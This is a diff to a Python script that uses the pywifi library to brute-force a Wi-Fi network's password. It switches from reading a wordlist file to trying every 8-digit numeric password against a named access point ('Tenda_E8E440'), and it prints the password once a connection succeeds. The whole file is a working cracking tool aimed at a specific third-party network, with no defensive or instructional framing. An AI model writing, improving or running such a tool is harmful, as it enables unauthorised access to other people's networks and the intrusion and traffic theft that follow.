@@ -1,6 +1,7 @@
 import pywifi
 from pywifi import const
 import time
+import itertools as its
 
 
 def getInterface():
@@ -20,7 +21,8 @@ def testwifi(interface, wifiname, password):
     interface.connect(profile)
     time.sleep(5)
     print(interface.status())
-    if interface.status() == const.IFACE_CONNECTED:
+    if interface.status() == 4:
+        print('good')
         return True
     else:
         return False
@@ -28,24 +30,20 @@ def testwifi(interface, wifiname, password):
 
 def beginWork(wifiname):
     interfaces = getInterface()
-    path = r'password-8位数字.txt'
-    files = open(path, 'r')
-    while True:
+    words_num = '1234567890'
+    dilib = its.product(words_num, repeat=8)
+    for password in dilib:
+        print(''.join(password))
         try:
-            password = files.readlines()
-            password = password.strip('\n')
-            print(password)
-            if not password:
-                break
-            print('正在尝试%s,%s' % (wifiname, password))
-            if testwifi(interfaces, wifiname, password):
+            print('正在尝试%s,%s' % (wifiname, ''.join(password)))
+            if testwifi(interfaces, wifiname, ''.join(password)):
+                print('%s的密码是%s' % (wifiname, ''.join(password)))
                 break
         except:
             continue
-        files.close()
 
 
-beginWork('CMCC-301')
+beginWork('Tenda_E8E440')
 
 # profile = pywifi.Profile()
 # profile.ssid = 'Xiaomi_A3F5'
@@ -58,3 +56,17 @@ beginWork('CMCC-301')
 # iface = wifi.interfaces()[0]
 # profile = iface.add_network_profile(profile)
 # iface.connect(profile)
+
+# while True:
+#     try:
+#         password = files.readline()
+#         password = password.strip('\n')
+#         if not password:
+#             break
+#         print('正在尝试%s,%s' % (wifiname, password))
+#         if testwifi(interfaces, wifiname, password):
+#             break
+#     except:
+#         print('error')
+#         continue
+# files.close()
